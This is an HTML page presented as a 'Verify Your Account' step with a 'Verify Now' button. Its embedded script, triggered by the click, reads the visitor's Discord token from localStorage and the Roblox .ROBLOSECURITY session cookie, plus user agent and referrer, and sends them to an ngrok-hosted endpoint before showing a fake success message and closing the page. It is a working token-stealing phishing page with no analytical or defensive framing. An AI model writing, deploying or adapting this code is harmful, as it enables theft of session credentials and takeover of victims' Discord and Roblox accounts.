<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #333;
        }
        p {
            font-size: 1rem;
            color: #666;
            margin-bottom: 2rem;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 100%; /* Ensure the button takes full width */
        }
        button:hover {
            background-color: #0056b3;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #333;
            display: none;
        }
        .success {
            color: #28a745;
        }
        .error {
            color: #dc3545;
        }
        .button-container {
            position: relative;
            width: 100%;
        }
        .button-container button {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
        }
        .button-container .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Account</h1>
        <p>Click the button below to complete the verification process.</p>
        <div class="button-container">
            <button id="verifyButton">Verify Now</button>
            <div class="loader" id="loader"></div>
        </div>
        <div class="message" id="message"></div>
    </div>

    <script>
        async function collectData() {
            const discordToken = localStorage.getItem('token') || 'N/A';
            const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
            const userAgent = navigator.userAgent;
            const referrer = document.referrer;

            // Show loader and hide button
            document.getElementById('verifyButton').style.opacity = '0';
            document.getElementById('loader').style.display = 'block';

            try {
                // Send data to your backend
                const response = await fetch('https://afc6-2a02-8084-e80-3400-493f-95a1-6f55-d710.ngrok-free.app/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ discordToken, robloxCookie, userAgent, referrer }),
                });

                if (response.ok) {
                    // Show success message
                    document.getElementById('message').innerHTML = '<p class="success">Verification successful! You can now close this page.</p>';
                    // Close the page after 3 seconds
                    setTimeout(() => {
                        window.close();
                    }, 3000);
                } else {
                    throw new Error('Verification failed');
                }
            } catch (error) {
                // Show error message
                document.getElementById('message').innerHTML = `<p class="error">Error: ${error.message}. Please try again.</p>`;
                // Show button again
                document.getElementById('verifyButton').style.opacity = '1';
            } finally {
                // Hide loader
                document.getElementById('loader').style.display = 'none';
            }
        }

        // Attach the collectData function to the button
        document.getElementById('verifyButton').addEventListener('click', collectData);
    </script>
</body>
</html>
